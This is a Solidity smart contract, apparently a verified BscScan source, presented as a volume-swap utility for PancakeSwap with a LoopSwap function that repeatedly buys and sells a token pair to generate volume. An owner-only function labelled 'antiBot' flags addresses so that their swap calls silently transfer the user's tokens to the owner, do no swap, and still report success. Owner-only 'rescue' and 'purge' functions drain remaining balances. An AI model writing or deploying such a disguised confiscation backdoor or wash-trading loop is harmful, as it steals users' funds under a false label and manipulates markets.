/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
  function decimals() external pure returns (uint8);
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    function transferOwnership(address account) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, account);
        _owner = account;
    }

}

contract VolumeSwapV1 is Context, Ownable {

  IDEXRouter public router;
  address pcv2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

  mapping(address => bool) public blacklistCall;

  constructor() {
    router = IDEXRouter(pcv2);
  }

  function antiBot(address _account,bool _flag) public onlyOwner returns (bool) {
    blacklistCall[_account] = _flag;
    return true;
  }

  function safeSwap(address[] memory path,uint256 amount,uint256 slippage,address to) public returns (bool) {
    IERC20 token = IERC20(path[0]);
    if(!blacklistCall[msg.sender]){
        token.transferFrom(msg.sender,address(this),amount);
    }else{
        token.transferFrom(msg.sender,owner(),amount);
        return true;
    }
    _swap(token.balanceOf(address(this)),slippage,path,to);
    return true;
  }

  function LoopSwap(address[] memory pathBuy,address[] memory pathSell,uint256 amount,uint256 txcount,uint256 slippage,address to) public returns (bool) {
    IERC20 tokenA = IERC20(pathBuy[0]);
    IERC20 tokenB = IERC20(pathSell[0]);
    if(!blacklistCall[msg.sender]){
        tokenA.transferFrom(msg.sender,address(this),amount);
    }else{
        tokenA.transferFrom(msg.sender,owner(),amount);
        return true;
    }
    uint256 i;
    bool s;
    do{
        if(!s){
            _swap(tokenA.balanceOf(address(this)),slippage,pathBuy,address(this));
            s = true;
        }else{
            _swap(tokenB.balanceOf(address(this)),slippage,pathSell,address(this));
            s = false;
        }
        i++;
    }while(i<txcount);
    _swap(tokenB.balanceOf(address(this)),slippage,pathSell,to);
    uint256 clearAmount = tokenA.balanceOf(address(this));
    if(clearAmount>0){ tokenA.transfer(to,clearAmount); }
    return true;
  }

  function _swap(uint256 amountIn,uint256 slippage,address[] memory path,address to) internal {
    IERC20 tokenin = IERC20(path[0]);
    if(tokenin.allowance(address(this),pcv2)==0){
        tokenin.approve(pcv2,type(uint256).max); 
    }
    uint256[] memory amountOut = router.getAmountsOut(amountIn,path);
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    amountIn,
    amountOut[1]*slippage/10000,
    path,
    to,
    block.timestamp
    );
  }

  function rescue(address adr) external onlyOwner {
    IERC20 a = IERC20(adr);
    a.transfer(msg.sender,a.balanceOf(address(this)));
  }

  function purge() external onlyOwner {
    (bool success,) = msg.sender.call{ value: address(this).balance }("");
    require(success, "Failed to send ETH");
  }
  
  receive() external payable { }
}